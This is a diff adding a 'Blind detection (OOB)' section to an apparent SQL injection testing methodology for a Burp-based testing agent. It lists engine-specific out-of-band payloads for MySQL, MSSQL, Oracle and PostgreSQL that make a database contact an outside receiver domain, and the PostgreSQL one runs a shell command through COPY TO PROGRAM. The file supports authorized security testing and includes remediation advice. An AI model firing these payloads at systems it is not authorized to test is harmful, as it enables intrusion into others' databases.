@@ -67,6 +67,18 @@ MCP tool signatures follow the `mcp-burp` skill.
 - **Evidence** per `methodology-evidence-capture`: full request/response pair showing the error or differential, sqlmap summary output, and a reproducible `burp_repeater_send` call that an independent reviewer can replay.
 - **Suggested fix:** Use parameterized queries or prepared statements; apply ORM-level escaping where raw SQL is unavoidable; run the database service under a least-privilege user account with no write access to system tables.
 
+## Blind detection (OOB)
+
+When error/boolean/time techniques are filtered, use the OOB receiver:
+
+1. `oob_get_payload` → note the `domain`.
+2. Engine-specific OOB primitive: MySQL `LOAD_FILE(CONCAT('\\\\',<domain>,'\\a'))`;
+   MSSQL `exec master..xp_dirtree '\\<domain>\a'`;
+   Oracle `UTL_HTTP.REQUEST('http://<domain>/')`;
+   PostgreSQL `COPY (SELECT '') TO PROGRAM 'nslookup <domain>'`.
+3. Send the request.
+4. `oob_poll since_id=0` — a `dns`/`http` interaction confirms blind SQLi.
+
 ## References
 
 - OWASP WSTG INPV-05: https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
